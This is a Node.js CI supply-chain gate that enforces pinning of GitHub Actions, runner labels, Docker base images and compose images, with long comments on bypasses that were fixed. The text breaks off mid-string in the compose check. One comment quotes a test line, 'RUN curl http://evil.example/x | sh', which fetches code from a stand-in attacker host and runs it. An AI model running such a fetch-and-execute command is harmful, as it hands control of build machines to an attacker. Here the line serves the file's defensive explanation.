#!/usr/bin/env node
/**
 * Gate: the build pipeline's own dependencies are pinned to immutable references.
 *
 * ## Why this gate exists
 *
 * The repository's dependency policy is "mutable references are how supply-chain
 * attacks land": exact versions, a frozen lockfile, a 7-day cooldown, integrity
 * hashes checked against the registry. Every one of those controls is enforced by
 * a gate. The *pipeline's* dependencies — GitHub Actions and container base
 * images — were held to the same standard by nothing but header comments in
 * ci.yml and Dockerfile.api. They were, and are, correct; but
 * `uses: actions/cache@v4` added tomorrow passed all eight gates, and
 * `actions/cache@v4` is a pointer its owner can repoint at new code that then
 * runs inside this repository's CI. The campaign in
 * docs/security/shai-hulud-snapshot-2026-08-17.md §1 lists **GitHub Actions and
 * Docker images** among the supply chains it compromised, and §2 says it hijacks
 * workflows to mint publish tokens.
 *
 * So: an unpinned `uses:`, an unpinned `FROM`, a floating `runs-on: *-latest`, or
 * a workflow file nobody declared is a release-blocking failure, the same as an
 * unpinned npm dependency.
 *
 * ## The workflow inventory
 *
 * `.github/workflows/codeql.yml` is a campaign IOC (§3): the worm injects a
 * workflow whose name squats on one people expect to see, so a reviewer's eye
 * slides past it. `ioc-scan.mjs` warns about that one filename. This gate takes
 * the stronger position available to a repository that knows its own workflows:
 * anything not in `EXPECTED_WORKFLOWS` fails, whatever it is called. Adding a
 * workflow is then a two-file diff, which is the point.
 *
 * ## Discovery is recursive, and that is a fix rather than a tidy-up
 *
 * This gate used to find its container files with a NON-recursive
 * `readdirSync(REPO_ROOT)` matching `/^Dockerfile(\..+)?$/` and
 * `/^docker-compose(\..+)?\.ya?ml$/`. Two whole classes of file were therefore
 * invisible to all nine gates:
 *
 *   * anything in a subdirectory — `deploy/staging/compose.yml`, a Dockerfile
 *     under `docker/`, an overlay under `k8s/`;
 *   * anything using Compose v2's filenames — `compose.yml`, `compose.yaml`,
 *     `compose.override.yml`, which is the spelling `docker compose` has
 *     preferred since v2 and which every new file is likely to use.
 *
 * An `image: postgres:16` in either of those passed the release audit in silence:
 * not "was checked and allowed", but "was never read". The walk below is
 * recursive and matches both naming conventions, and
 * `ci-pinning.test.mjs` feeds it a nested `compose.yml` with an unpinned image to
 * prove it now fires.
 *
 * ## `runs-on` has five spellings and this gate knew one of them
 *
 * The floating-runner check was `/^\s*runs-on:\s*(\S+)/` followed by
 * `runner.endsWith('-latest')`. That reads exactly one of the forms GitHub
 * accepts. Measured end to end against a scratch repository carrying the three
 * declared workflows, everything else correctly pinned, one spelling per run:
 *
 *   | `runs-on: ubuntu-latest`                            | FAIL, exit 1 |
 *   | `runs-on: "ubuntu-latest"`                          | **pass, exit 0** |
 *   | `runs-on:` + `  - ubuntu-latest`                    | **pass, exit 0** |
 *   | `runs-on: [ubuntu-latest]`                          | **pass, exit 0** |
 *   | `runs-on:` + `  group: default` + `  labels: ubuntu-latest` | **pass, exit 0** |
 *   | `os: [ubuntu-latest]` + `runs-on: ${{ matrix.os }}` | **pass, exit 0** |
 *
 * One quote character disabled a release-blocking gate, and the run printed a
 * green tick rather than saying it had judged nothing. `parseRunsOn` below reads
 * all five, and `matrixValues` resolves the matrix case from the same file.
 *
 * Two rules follow from the shape of the defect, and both are deliberate:
 *
 *   * A `runs-on` this gate CANNOT resolve to a concrete label — an expression
 *     over `inputs`, `vars`, `github.*`, or a `matrix` key that is not defined in
 *     the file — is a FAILURE, not a pass. "I could not read it" and "I read it
 *     and it was pinned" produced the same exit code before, which is precisely
 *     how the six spellings above survived. The remedy is cheap: name the runner
 *     literally, or put the value in the matrix in the same file.
 *   * The matrix parse deliberately OVER-collects: it gathers every scalar under
 *     a `matrix:` block, including `include:` entries, without tracking which key
 *     belongs to which job. Over-collection can only make the gate judge more
 *     labels, never fewer, so the failure mode of a loose parse here is a false
 *     positive a human resolves in seconds — not a silent pass.
 *
 * `ci-pinning.test.mjs` feeds every spelling in the table above, including the
 * quoted one that started this.
 *
 * ## Every reader here is a line regex, and YAML has flow styles
 *
 * The same defect one level up. `uses:`, `runs-on:`, `image:` and `container:` are
 * all read by patterns anchored at `^\s*`, and a YAML flow mapping puts a key
 * anywhere on the line. GitHub's parser accepts both spellings. Measured against
 * the exported checks, one form per call, everything else correctly pinned:
 *
 *   | `- uses: actions/checkout@v7`                    | FAIL, 1 judged |
 *   | `- {uses: actions/checkout@v7}`                  | **pass, 0 judged** |
 *   | `steps: [{uses: actions/checkout@v7}]`           | **pass, 0 judged** |
 *   | `- uses:` + `    actions/checkout@v7`            | **pass, 0 judged** |
 *   | `a: {runs-on: ubuntu-latest, steps: []}`         | **pass, 0 declarations** |
 *   | `pg: {image: postgres:16}`                       | **pass, 0 judged** |
 *
 * And the note said so without saying anything: "1 workflow(s), 0 action
 * reference(s)" over a green tick. `scripts/keyless-identity.mjs` learned the flow
 * form for `permissions:` after an adversarial review found it blind to it; this
 * file reads the same four files and did not.
 *
 * `checkNothingWasUnread` refuses a line carrying one of those keys in a shape the
 * readers cannot see, rather than teaching four regexes to parse flow YAML. The
 * remedy is block style, which is what every workflow here already writes.
 *
 * ## And the local action nobody opened
 *
 * `uses: ./…` is cleared here because "a local action lives in this repository and
 * is reviewed with it" — a statement about review, not about this gate, which read
 * `.github/workflows/*.yml` and nothing else. A composite action containing
 * `uses: actions/checkout@v7` was therefore a two-hop bypass: the workflow line
 * passed because it was local, and the local file was never read.
 * `discoverLocalActionFiles` finds every `action.yml`/`action.yaml` in the tree and
 * holds it to the same rule. There are none today, so it carries no minimum — the
 * subject is the file somebody adds next week.
 *
 * ## The one thing an `image:` may be other than a digest
 *
 * `docker-compose.staging.yml` deploys the two application images **by digest**,
 * and those digests are produced per build by `pnpm run release:artifacts`. They
 * cannot be literals in a committed file. The value is therefore a compose
 * interpolation that is REQUIRED and has NO default —
 * `${PRL_API_IMAGE:?the API image DIGEST...}` — and that exact shape is accepted
 * here, for a reason worth stating precisely:
 *
 *   * `${VAR:-postgres:16}` is REJECTED. The default is a committed mutable tag,
 *     which is exactly what this gate exists to forbid, and it is the shape a
 *     reader is most likely to reach for.
 *   * `${VAR}` is REJECTED. Compose substitutes empty and fails obscurely, and
 *     nothing about the value is constrained.
 *   * `${VAR:?message}` is ACCEPTED. Nothing mutable is committed, and compose
 *     refuses to run at all without a value.
 *
 * What this gate cannot see is whether the injected value is itself a digest. That
 * is checked where it can be: `scripts/staging.mjs` refuses a manifest whose
 * references are not `name@sha256:<64 hex>`, and after `up` it compares the
 * running containers' images against the manifest and fails on a difference. The
 * split is deliberate — a static gate should not pretend to know a runtime value —
 * and it is recorded here so the exception is not read as a loophole.
 *
 * ## `--freshness`: a reporter, not a gate
 *
 * Passing `--freshness` re-resolves every pinned tag against its registry and
 * reports which digests have moved upstream. It exits 0 whatever it finds, and
 * that is deliberate rather than lax: a base image rebuilt for a security patch
 * must be VISIBLE, but failing the build on it would make every offline or
 * rate-limited run red and would put a network dependency in the middle of an
 * otherwise hermetic gate. Drift is a prompt to review and refresh a digest, in a
 * reviewed diff, which is the whole point of pinning.
 *
 * The checks are pure functions over file text so
 * `scripts/supply-chain/ci-pinning.test.mjs` can feed them the real attacks.
 *
 * Usage:
 *     node scripts/supply-chain/ci-pinning.mjs               the gate
 *     node scripts/supply-chain/ci-pinning.mjs --freshness   the drift report
 *     node scripts/supply-chain/ci-pinning.mjs --freshness --json
 *
 * Exit codes: 0 pass (and 0 from --freshness whatever it finds), 1 a gate failure
 * or a bad argument.
 */

import { existsSync, readdirSync, readFileSync } from 'node:fs';
import { join, relative } from 'node:path';
import { EXPECTED_WORKFLOWS } from './denied-packages.mjs';
import { bold, dim, Gate, green, REPO_ROOT, red, runGate, yellow } from './lib.mjs';

/** A full git commit SHA. Anything shorter is ambiguous and anything else is a moving pointer. */
const COMMIT_SHA = /^[0-9a-f]{40}$/;
/** An OCI content digest. */
const IMAGE_DIGEST = /@sha256:[0-9a-f]{64}$/;

/**
 * A compose value that is entirely a required interpolation with no default:
 * `${VAR:?message}` or `${VAR?message}`. See the header for why this shape, and
 * only this shape, is an acceptable `image:`.
 */
const REQUIRED_INTERPOLATION = /^\$\{[A-Za-z_][A-Za-z0-9_]*:?\?[^}]*\}$/;

/** Directories that never contain first-party container files. */
const SKIP_DIRS = new Set([
  '.git',
  'node_modules',
  'dist',
  '.next',
  'coverage',
  '.pnpm-store',
  '.turbo',
  'sbom',
]);

/**
 * `Dockerfile`, `Dockerfile.api`, `Dockerfile.web` — and `api.Dockerfile`.
 *
 * The suffix form is the other half of the convention (it is what buildx's own
 * examples and most editors' syntax highlighting key on), and it was invisible
 * here: the pattern was anchored at the front, so `api.Dockerfile` matched
 * nothing, was never read, and an unpinned `FROM` in one passed the release
 * audit in silence. Same class as the non-recursive walk above — a file the gate
 * never opened, reported as a pass.
 */
const DOCKERFILE_NAME = /^(?:Dockerfile(?:\..+)?|.+\.Dockerfile)$/;
/**
 * Compose v1 (`docker-compose.yml`, `docker-compose.staging.yml`) and Compose v2
 * (`compose.yaml`, `compose.override.yml`). The `docker-` prefix is optional
 * because v2 dropped it, and a file named `compose.yml` matched neither of the
 * old patterns — so an unpinned image in one was invisible to every gate.
 */
const COMPOSE_NAME = /^(?:docker-)?compose(\..+)?\.ya?ml$/;

/**
 * Strips YAML/Dockerfile line comments so prose *about* an unpinned reference is
 * not read as one. ci.yml's own header contains the literal text
 * `uses: actions/checkout@v7` as an example of what not to write.
 */
function uncomment(line) {
  const trimmed = line.trimStart();
  if (trimmed.startsWith('#')) return '';
  const hash = line.indexOf(' #');
  return hash === -1 ? line : line.slice(0, hash);
}

/** Every `.yml`/`.yaml` file under `.github/workflows`, by bare filename. */
export function listWorkflowFiles(workflowDir) {
  if (!existsSync(workflowDir)) return [];
  return readdirSync(workflowDir, { withFileTypes: true })
    .filter((e) => e.isFile() && /\.ya?ml$/.test(e.name))
    .map((e) => e.name)
    .sort();
}

/**
 * Every `action.yml` / `action.yaml` in the repository — a LOCAL action, composite
 * or docker, reachable from a workflow as `uses: ./path/to/it`.
 *
 * `checkWorkflowPinning` clears `./…` on the grounds that "a local action lives in
 * this repository and is reviewed with it". That is a statement about review, not
 * about this gate: the gate read `.github/workflows/*.yml` and nothing else, so a
 * composite action containing `uses: actions/checkout@v7` was a two-hop bypass of
 * the rule this file exists to enforce — the workflow line passed because it was
 * local, and the local file was never opened. There are none in this repository
 * today, which is why this is discovery with no minimum rather than a
 * scan-of-nothing assertion: the file somebody adds next week is the subject.
 *
 * @param {string} root
 * @returns {string[]} repo-relative paths
 */
export function discoverLocalActionFiles(root) {
  const found = [];
  const walk = (dir) => {
    let entries;
    try {
      entries = readdirSync(dir, { withFileTypes: true });
    } catch {
      return;
    }
    for (const entry of entries) {
      const full = join(dir, entry.name);
      if (entry.isDirectory()) {
        if (SKIP_DIRS.has(entry.name)) continue;
        walk(full);
        continue;
      }
      if (entry.isFile() && /^action\.ya?ml$/.test(entry.name)) {
        found.push(relative(root, full).split('\\').join('/'));
      }
    }
  };
  walk(root);
  return found.sort();
}

/**
 * Check: only the declared workflows exist, and all of them do.
 *
 * @param {Gate} gate
 * @param {string[]} present bare filenames
 */
export function checkWorkflowInventory(gate, present) {
  for (const name of present) {
    if (EXPECTED_WORKFLOWS.has(name)) continue;
    gate.fail(
      `unexpected workflow file: .github/workflows/${name}`,
      'this repository declares its workflows in EXPECTED_WORKFLOWS (scripts/supply-chain/denied-packages.mjs). ' +
        'An injected workflow is how the campaign mints publish tokens from CI — .github/workflows/codeql.yml ' +
        'is a named IOC. If this file is legitimate, add it there in the same reviewed diff.',
    );
  }
  for (const name of EXPECTED_WORKFLOWS) {
    if (present.includes(name)) continue;
    gate.fail(
      `declared workflow is missing: .github/workflows/${name}`,
      'a workflow that silently disappears takes its gate with it',
    );
  }
  if (present.length === 0) {
    gate.fail('no workflow files found', 'this gate examined nothing — a scan of nothing proves nothing');
  }
}

/**
 * Reads the value of an `image:` line.
 *
 * Takes the rest of the line rather than the first whitespace-delimited token,
 * because a required compose interpolation carries a human-readable message and
 * therefore contains spaces: `image: ${PRL_API_IMAGE:?the API image DIGEST...}`.
 * A `\S+` capture read that as `${PRL_API_IMAGE:?the` and judged a fragment.
 */
function imageValue(line) {
  const match = /^\s*image:\s*(.+?)\s*$/.exec(line);
  if (match === null) return null;
  return unquote(match[1] ?? '');
}

/**
 * Reads a job-level `container:` SHORTHAND — `container: node:22`.
 *
 * GitHub documents `jobs.<id>.container` as "a string or a map": the map form
 * carries an `image:` key, and the string form is the image reference written
 * straight onto the `container:` line. This gate only ever looked for `image:`,
 * so the shorthand was never judged at all. Measured on a scratch repository:
 * `container: node:22` produced no failures and exit 0, while the long form
 * `container:` + `  image: node:22` failed correctly. The job container is the
 * environment every step in the job executes inside — a strictly larger blast
 * radius than the service containers the gate already catches.
 *
 * Returns null for the map form (an empty value), which the `image:` check
 * covers one line further down, and for any other key.
 */
function containerValue(line) {
  const match = /^\s*container:\s*(.+?)\s*$/.exec(line);
  if (match === null) return null;
  const value = unquote(match[1] ?? '');
  return value === '' ? null : value;
}

/** Strips one matching pair of surrounding quotes. `"ubuntu-latest"` is `ubuntu-latest`. */
function unquote(value) {
  const v = value.trim();
  const quoted =
    v.length >= 2 && ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'")));
  return quoted ? v.slice(1, -1) : v;
}

/** A YAML scalar or a flow sequence, as a list of values. `[a, b]` is `['a', 'b']`. */
function scalarOrFlowSequence(value) {
  const v = value.trim();
  if (v.startsWith('[') && v.endsWith(']')) {
    return v
      .slice(1, -1)
      .split(',')
      .map(unquote)
      .filter((s) => s !== '');
  }
  const single = unquote(v);
  return single === '' ? [] : [single];
}

/** How far a line is indented, ignoring its content. */
const indentOf = (line) => line.length - line.trimStart().length;

/**
 * Every scalar that appears under a `strategy.matrix:` block, keyed by the
 * matrix key it sits under, so `runs-on: ${{ matrix.os }}` can be resolved to
 * the labels that expression actually expands to.
 *
 * Deliberately permissive — see the header. It does not track which `matrix:`
 * belongs to which job and it folds `include:` entries in under their own keys,
 * so it can attribute a label to a job that never uses it. That direction is
 * safe: it makes the gate judge MORE labels. The direction that is not safe is
 * the one this file already suffered, where an expression resolved to nothing
 * and the job read as pinned.
 *
 * @returns {Map<string, Set<string>>}
 */
export function matrixValues(text) {
  /** @type {Map<string, Set<string>>} */
  const values = new Map();
  const add = (key, list) => {
    const bag = values.get(key) ?? new Set();
    for (const value of list) if (value !== '') bag.add(value);
    values.set(key, bag);
  };
  const lines = text.split('\n').map(uncomment);
  for (const [index, line] of lines.entries()) {
    const header = /^(\s*)matrix:\s*$/.exec(line);
    if (header === null) continue;
    const baseIndent = (header[1] ?? '').length;
    let currentKey = null;
    for (let j = index + 1; j < lines.length; j++) {
      const raw = lines[j];
      if (raw.trim() === '') continue;
      if (indentOf(raw) <= baseIndent) break;
      const body = raw.trim();
      const item = /^-\s*(.*)$/.exec(body);
      if (item !== null) {
        const rest = (item[1] ?? '').trim();
        const inlinePair = /^([A-Za-z_][\w.-]*):\s*(.+)$/.exec(rest);
        if (inlinePair !== null) add(inlinePair[1] ?? '', scalarOrFlowSequence(inlinePair[2] ?? ''));
        else if (currentKey !== null) add(currentKey, [unquote(rest)]);
        continue;
      }
      const pair = /^([A-Za-z_][\w.-]*):\s*(.*)$/.exec(body);
      if (pair === null) continue;
      currentKey = pair[1] ?? null;
      const inline = (pair[2] ?? '').trim();
      if (currentKey !== null && inline !== '') add(currentKey, scalarOrFlowSequence(inline));
    }
  }
  return values;
}

/**
 * Every `runs-on` in a workflow, in all five spellings GitHub accepts, as the
 * concrete labels it names plus the `${{ … }}` expressions it defers.
 *
 * The spellings, and where each one is handled:
 *
 *   * `runs-on: ubuntu-latest`            plain scalar
 *   * `runs-on: "ubuntu-latest"`          quoted scalar — `unquote`
 *   * `runs-on: [ubuntu-latest, x]`       flow sequence — `scalarOrFlowSequence`
 *   * `runs-on:` / `  - ubuntu-latest`    block sequence — the indented walk
 *   * `runs-on:` / `  group: …` / `  labels: …`  runner-group mapping, where the
 *     `labels:` key (itself a scalar, a flow sequence, or a nested block
 *     sequence) is what names the runner image; `group:` names a pool whose
 *     membership is not in this file and is not judged here.
 *
 * @returns {Array<{line: number, labels: string[], expressions: string[]}>}
 */
export function parseRunsOn(text) {
  const lines = text.split('\n').map(uncomment);
  const found = [];
  for (const [index, line] of lines.entries()) {
    const head = /^(\s*)runs-on:\s*(.*)$/.exec(line);
    if (head === null) continue;
    const baseIndent = (head[1] ?? '').length;
    const inline = (head[2] ?? '').trim();
    let labels;
    if (inline !== '') {
      labels = scalarOrFlowSequence(inline);
    } else {
      const sequence = [];
      const labelled = [];
      let collect = sequence;
      for (let j = index + 1; j < lines.length; j++) {
        const raw = lines[j];
        if (raw.trim() === '') continue;
        if (indentOf(raw) <= baseIndent) break;
        const body = raw.trim();
        const item = /^-\s*(.*)$/.exec(body);
        if (item !== null) {
          const value = unquote(item[1] ?? '');
          if (value !== '') collect.push(value);
          continue;
        }
        const pair = /^([A-Za-z_][\w.-]*):\s*(.*)$/.exec(body);
        if (pair === null) continue;
        const value = (pair[2] ?? '').trim();
        if (pair[1] === 'labels') {
          if (value === '') collect = labelled;
          else labelled.push(...scalarOrFlowSequence(value));
          continue;
        }
        // `group:` or anything else: a later `- item` belongs to the sequence again.
        collect = sequence;
      }
      labels = labelled.length > 0 ? labelled : sequence;
    }
    found.push({
      line: index + 1,
      labels: labels.filter((l) => !l.includes('${{')),
      expressions: labels.filter((l) => l.includes('${{')),
    });
  }
  return found;
}

/**
 * Substitutes `${{ matrix.<key> }}` for every value that key takes, returning one
 * string per combination. A string that still contains `${{` after this could not
 * be resolved from the file and its caller must refuse to judge it.
 */
function expandMatrixExpression(expression, matrix) {
  let current = [expression];
  // Bounded: a runner label is one or two substitutions, and an unbounded loop
  // over attacker-supplied text inside a security gate is its own problem.
  for (let pass = 0; pass < 4; pass++) {
    if (!current.some((s) => s.includes('${{'))) break;
    const next = [];
    for (const candidate of current) {
      const match = /\$\{\{\s*matrix\.([A-Za-z_][\w-]*)\s*\}\}/.exec(candidate);
      const bag = match === null ? undefined : matrix.get(match[1] ?? '');
      if (match === null || bag === undefined || bag.size === 0) {
        next.push(candidate);
        continue;
      }
      for (const value of bag) {
        next.push(candidate.slice(0, match.index) + value + candidate.slice(match.index + match[0].length));
      }
    }
    current = next;
  }
  return current;
}

/**
 * Check: no job runs on a floating `*-latest` runner label, in any spelling.
 *
 * @param {Gate} gate
 * @param {string} label
 * @param {string} text
 * @returns {number} how many `runs-on` declarations were judged
 */
export function checkRunnerPinning(gate, label, text) {
  const matrix = matrixValues(text);
  const declarations = parseRunsOn(text);
  for (const declaration of declarations) {
    const at = `${label}:${declaration.line}`;
    const runners = [...declaration.labels];
    let unresolved = 0;
    for (const expression of declaration.expressions) {
      for (const expanded of expandMatrixExpression(expression, matrix)) {
        if (expanded.includes('${{')) {
          unresolved += 1;
          gate.fail(
            `runs-on cannot be resolved to a runner label at ${at}: ${expanded}`,
            'this gate refuses to call a runner pinned when it could not read which runner it is. ' +
              'The expression names something outside this file (an input, a repository variable, a ' +
              'matrix key defined elsewhere), so "ubuntu-latest" and "ubuntu-24.04" are indistinguishable ' +
              "from here. Name the runner literally, or put the value in this workflow's matrix.",
          );
          continue;
        }
        runners.push(expanded);
      }
    }
    // `unresolved > 0` has already failed above, and reporting the same runs-on
    // twice trains a reader to skim the second line.
    if (runners.length === 0 && unresolved === 0) {
      gate.fail(
        `runs-on names no runner label at ${at}`,
        'the gate parsed this runs-on and came away with nothing to judge — a runner-group mapping with ' +
          'no `labels:` key, or a form this parser does not read. Either is an unjudged runner, which is ' +
          'the exact failure this check was rewritten to stop reporting as a pass.',
      );
      continue;
    }
    for (const runner of runners) {
      if (!runner.endsWith('-latest')) continue;
      gate.fail(
        `floating runner image at ${at}: ${runner}`,
        'pin the runner version (e.g. ubuntu-24.04) so a runner-image rollout is a reviewed change ' +
          'rather than an overnight one',
      );
    }
  }
  return declarations.length;
}

/**
 * The four keys this file's line-oriented readers judge, wherever they appear on
 * a line rather than only at the start of one.
 *
 * `[\s{,[]` and not `[-]`: `- uses:` puts a space between the dash and the key,
 * while `Base-image digest freshness` would otherwise read as an `image` key.
 */
const READ_KEY_MENTION = /(?:^|[\s{,[])(uses|runs-on|image|container)\s*:/g;

/**
 * Whether the reader for `key` would have read this line at all.
 *
 * Every one of them is anchored with `^\s*`, which is the whole point: YAML's
 * FLOW styles put a key anywhere on the line, and a key the gate never read is a
 * key it never cleared. `uses` additionally needs a value on the same line —
 * `- uses:` with the reference on the next line is a plain multi-line scalar
 * that GitHub accepts and `/^\s*-?\s*uses:\s*(\S+)/` does not match.
 */
function readsKeyOnLine(key, line) {
  if (key === 'uses') return /^\s*-?\s*uses:\s*\S/.test(line);
  if (key === 'runs-on') return /^\s*runs-on:/.test(line);
  if (key === 'image') return /^\s*image:/.test(line);
  return /^\s*container:/.test(line);
}

/**
 * Check: nothing on this line carries one of the four keys in a shape the readers
 * above cannot see.
 *
 * ## Why a mismatch is a failure rather than a smaller number
 *
 * Every reader in this file is a line regex anchored at the start of the line, so
 * all four are blind to YAML's flow styles, which GitHub's parser accepts exactly
 * as it accepts the block ones. Measured against the exported checks, one form per
 * call, everything else in the workflow correctly pinned:
 *
 *   | `- uses: actions/checkout@v7`            | FAIL, 1 judged   |
 *   | `- {uses: actions/checkout@v7}`          | **pass, 0 judged** |
 *   | `steps: [{uses: actions/checkout@v7}]`   | **pass, 0 judged** |
 *   | `- uses:` + newline + `    actions/checkout@v7` | **pass, 0 judged** |
 *   | `a: {runs-on: ubuntu-latest}`            | **pass, 0 declarations** |
 *   | `pg: {image: postgres:16}`               | **pass, 0 judged** |
 *
 * The `judged`/`runs-on` counts this file returns are a NOTE, not an assertion, so
 * the run said "1 workflow(s), 0 action reference(s)" and printed a green tick.
 * That is the same defect as `FROM node AS node` two functions down and the same
 * defect as the `runs-on` spellings in the header, and it is the reason the
 * Dockerfile check's counter was made load-bearing. This is that counter for the
 * workflow reader, and it is per-line so the message can name the line.
 *
 * `scripts/keyless-identity.mjs` already learned the flow-mapping form for
 * `permissions:` after an adversarial review found it blind to it. This file did
 * not, and the two gates read the same files.
 *
 * The failure mode of this check is a false positive on a legitimate flow-style
 * line, resolved by writing it in block style — which is what every workflow in
 * this repository already does. The failure mode it replaces is silence.
 *
 * @param {Gate} gate
 * @param {string} line  already passed through `uncomment`
 * @param {string} at   `<file>:<line>`, which already carries the file name
 */
function checkNothingWasUnread(gate, line, at) {
  READ_KEY_MENTION.lastIndex = 0;
  const seen = new Map();
  for (const match of line.matchAll(READ_KEY_MENTION)) {
    const key = match[1] ?? '';
    seen.set(key, (seen.get(key) ?? 0) + 1);
  }
  for (const [key, mentions] of seen) {
    const read = readsKeyOnLine(key, line) ? 1 : 0;
    if (mentions <= read) continue;
    gate.fail(
      `a \`${key}:\` at ${at} is in a shape this gate cannot read: ${line.trim()}`,
      'the readers in ci-pinning.mjs are anchored at the start of a line, so a key written in a YAML ' +
        'FLOW mapping (`- {uses: …}`, `[{image: …}]`) or with its value on the following line is never ' +
        'judged at all — and an unjudged reference used to print a green tick. Write it in block style, ' +
        'one key per line, which is what every workflow in this repository already does.',
    );
  }
}

/**
 * Check: every `uses:` is a full commit SHA, a local action, or a digest-pinned
 * container action; every container the job runs in or beside is digest-pinned;
 * no job runs on a floating `*-latest` runner label (`checkRunnerPinning`, which
 * reads all five spellings of `runs-on` — see the header); and nothing carrying
 * one of those keys went unread (`checkNothingWasUnread`).
 *
 * @param {Gate} gate
 * @param {string} label  how to name this file in a message
 * @param {string} text
 * @returns {number} how many `uses:` references were judged
 */
export function checkWorkflowPinning(gate, label, text) {
  let judged = 0;
  checkRunnerPinning(gate, label, text);
  for (const [index, rawLine] of text.split('\n').entries()) {
    const line = uncomment(rawLine);
    const at = `${label}:${index + 1}`;
    checkNothingWasUnread(gate, line, at);

    const uses = /^\s*-?\s*uses:\s*(\S+)/.exec(line);
    if (uses) {
      judged += 1;
      const reference = uses[1] ?? '';
      if (reference.startsWith('./') || reference.startsWith('.\\')) {
        // A local action lives in this repository and is reviewed with it.
      } else if (reference.startsWith('docker://')) {
        if (!IMAGE_DIGEST.test(reference)) {
          gate.fail(
            `container action is not digest-pinned at ${at}: ${reference}`,
            'use docker://image@sha256:<64 hex> so the image cannot be replaced under the tag',
          );
        }
      } else {
        const atSign = reference.lastIndexOf('@');
        const ref = atSign === -1 ? '' : reference.slice(atSign + 1);
        if (!COMMIT_SHA.test(ref)) {
          gate.fail(
            `action is not pinned to a full commit SHA at ${at}: ${reference}`,
            'a tag or branch is a pointer the action owner — or whoever compromises them — can repoint ' +
              "at new code that then runs in this repository's CI. Use owner/repo@<40-char SHA> with the " +
              'version in a trailing comment; see the ci.yml header for how to obtain one.',
          );
        }
      }
      continue;
    }

    // The job-level `container:` shorthand — `container: node:22`. See
    // `containerValue` for what this could not see and how that was measured.
    const container = containerValue(line);
    if (container !== null && !IMAGE_DIGEST.test(container)) {
      gate.fail(
        `job container is not digest-pinned at ${at}: ${container}`,
        'this is the image every step in the job runs inside; a tag is a pointer its publisher can ' +
          'repoint. Pin image:tag@sha256:<64 hex> with the tag kept in a comment.',
      );
      continue;
    }

    const image = imageValue(line);
    if (image !== null && !IMAGE_DIGEST.test(image)) {
      // A workflow is not interpolated by compose, so the required-interpolation
      // exception below deliberately does not apply here: a service container
      // reference is either a digest or it is mutable.
      gate.fail(
        `service container is not digest-pinned at ${at}: ${image}`,
        'a tag is mutable; pin image:tag@sha256:<64 hex> with the tag kept in a comment',
      );
    }
  }
  return judged;
}

/**
 * Check: every `FROM` either refers to a stage declared EARLIER in the same file
 * or carries an image digest.
 *
 * ## A stage named after its own image used to bypass this entirely
 *
 * The stage registration ran BEFORE the "is this an earlier stage" test:
 *
 *     if (asIndex !== -1) { … stages.add(stage); }
 *     if (stages.has(image) || image === '') continue;
 *
 * so `FROM node AS node` added `node` to `stages` and then immediately matched
 * it, and the line was skipped as an internal reference to a stage that is in
 * fact itself. Measured: a `Dockerfile.api` of `FROM node AS node` plus
 * `RUN curl http://evil.example/x | sh`, every other file correctly pinned —
 * gate passed, exit 0. The only trace anywhere in the output was the note
 * counting one fewer external base image, and `judged` was not incremented
 * either, so no coverage counter could flag it. `docker build` resolves that
 * `FROM` against the registry, not against the stage, so the bypass shipped a
 * genuinely unpinned image.
 *
 * The stage is now registered after the test, which is the only order that is
 * correct anyway: Docker itself resolves a stage name against stages declared
 * before the current line.
 *
 * ## And the counter that would have caught it
 *
 * A gate that silently judges fewer things is the shape of this defect and of
 * the `runs-on` one above, so the count is now load-bearing rather than
 * decorative: the FIRST `FROM` in a Dockerfile can never be an internal stage
 * reference, because no stage has been declared yet. A file with `FROM` lines
 * and zero external base images judged is therefore impossible, and is reported
 * as a failure rather than as a quietly smaller number. That is exactly what
 * `FROM node AS node` produced.
 *
 * @param {Gate} gate
 * @param {string} label
 * @param {string} text
 * @returns {number} how many external base images were judged
 */
export function checkDockerfilePinning(gate, label, text) {
  const stages = new Set();
  let judged = 0;
  let fromLines = 0;
  for (const [index, rawLine] of text.split('\n').entries()) {
    const line = uncomment(rawLine);
    const from = /^\s*FROM\s+(.+)$/i.exec(line);
    if (!from) continue;
    fromLines += 1;
    const at = `${label}:${index + 1}`;
    const parts = (from[1] ?? '').trim().split(/\s+/);
    const words = parts.filter((p) => !p.startsWith('--'));
    const image = words[0] ?? '';
    const asIndex = words.findIndex((w) => w.toLowerCase() === 'as');
    const stage = asIndex === -1 ? undefined : words[asIndex + 1];
    // Registered AFTER the test below, never before it — see the header above.
    const declareStage = () => {
      if (stage !== undefined) stages.add(stage);
    };

    if (image === '') {
      // `FROM --platform=linux/amd64` and nothing else: not an internal
      // reference and not a digest, so it must not fall through as neither.
      gate.fail(
        `FROM names no image at ${at}: ${(from[1] ?? '').trim()}`,
        'the gate could not read a base image from this line, and a line it cannot read is not a line ' +
          'it has cleared',
      );
      declareStage();
      continue;
    }
    // A reference to an earlier stage in the same file is internal to this build.
    if (stages.has(image)) {
      declareStage();
      continue;
    }
    judged += 1;
    declareStage();
    if (!IMAGE_DIGEST.test(image)) {
      gate.fail(
        `base image is not digest-pinned at ${at}: ${image}`,
        'a tag can be repointed at a new image after review; pin image:tag@sha256:<64 hex> and keep ' +
          'the human-readable tag in a comment above it',
      );
    }
  }

  if (fromLines === 0) {
    gate.fail(
      `no FROM instruction in ${label}`,
      'this file was discovered as a Dockerfile and the base-image check found nothing in it to judge. ' +
        'A scan of nothing proves nothing.',
    );
  } else if (judged === 0) {
    gate.fail(
      `${label} declares ${fromLines} FROM line(s) and no external base image`,
      'impossible in a real Dockerfile: the first FROM cannot reference a stage because none has been ' +
        'declared yet. This is what `FROM <image> AS <image>` looked like — every FROM absorbed as an ' +
        'internal stage reference and nothing judged at all.',
    );
  }
  return judged;
}

/**
 * Check: every `image:` in a compose file carries a digest, or is a required
 * interpolation with no default. Services built from a local Dockerfile have no
 * `image:` and are covered by the Dockerfile check.
 *
 * @param {Gate} gate
 * @param {string} label
 * @param {string} text
 * @returns {number}
 */
export function checkComposePinning(gate, label, text) {
  let judged = 0;
  for (const [index, rawLine] of text.split('\n').entries()) {
    const line = uncomment(rawLine);
    const reference = imageValue(line);
    if (reference === null) continue;
    judged += 1;
    if (IMAGE_DIGEST.test(reference)) continue;
    if (REQUIRED_INTERPOLATION.test(reference)) continue;
    gate.fail(
      `compose image is not digest-pinned at ${label}:${index + 1}: ${reference}`,
      'pin image:tag@sha256:<64 hex>; a tag is mutable and this is the artefact that ships. The only ' +
        'other accepted form is a compose interpolation that is REQUIRED and has no default — the ' +
        'colon-question-mark form, as in PRL_API_IMAGE:?why — because nothing mutable is then ' +
